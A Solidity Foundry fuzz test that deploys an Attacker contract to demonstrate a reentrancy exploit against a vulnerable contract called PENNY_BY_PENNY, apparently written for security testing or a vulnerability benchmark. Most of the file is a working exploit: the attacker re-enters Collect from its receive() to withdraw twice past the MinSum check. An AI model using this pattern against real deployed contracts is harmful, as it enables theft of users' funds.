
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PENNY_BY_PENNY, LogFile} from "../src/PENNY_BY_PENNY.sol";

contract TestReentrancyPENNY_BY_PENNY is Test {
    PENNY_BY_PENNY public _contractUnderTest;
    LogFile public _logFile;
    Attacker public _attacker;

    function setUp() public {
        _logFile = new LogFile();
        _contractUnderTest = new PENNY_BY_PENNY();
        
        _contractUnderTest.SetLogFile(address(_logFile));
        // Note: We do not call Initialized() here to allow SetMinSum in the test function.
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal > 0.01 ether);
        vm.assume(attackVal < 1000 ether);
        

        // --- 2. State Configuration (Pre-Condition) ---
        // We set MinSum to 2 * attackVal.
        // This ensures that a single withdrawal reduces the balance below MinSum,
        // preventing a second withdrawal in a normal sequential scenario.
        // Reentrancy allows bypassing this check before the balance is updated.
        _contractUnderTest.SetMinSum(attackVal * 2);
        _contractUnderTest.Initialized();

        // --- 3. Funding ---
        // Fund the victim (though Put will add funds, extra safety)
        vm.deal(address(_contractUnderTest), attackVal * 4); 
        
        // Fund the Test Contract to send ETH to the Attacker
        vm.deal(address(this), attackVal * 4);

        // --- 4. Trigger Attack ---
        // Setup: Deposit 2 * attackVal into the victim via the attacker
        _attacker.setupAttack{value: attackVal * 2}(attackVal);
        
        // Time travel to satisfy the 'block.timestamp > acc.unlockTime' condition
        // Put(0) sets unlockTime to block.timestamp, so we must move forward.
        vm.warp(block.timestamp + 100);

        // Attack: Attempt to withdraw 'attackVal' twice
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}

    fallback() external payable {}
}

contract Attacker {
    PENNY_BY_PENNY public target;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public storedVal;

    constructor(address victimAddress) { 
        target = PENNY_BY_PENNY(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedVal = val;
        
        // Deposit funds (2 * val) to meet MinSum requirements
        target.Put{value: msg.value}(0);
    }

    function attack(uint256 val) public {
        attackCallCount = 0;
        
        // Initiate the first withdrawal
        target.Collect(val);

        // If we successfully re-entered, count will be >= 2
        if (attackCallCount >= 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        
        // Re-enter once
        if (attackCallCount < 2) {            
            target.Collect(storedVal);
        }
    }

    fallback() external payable {}
}
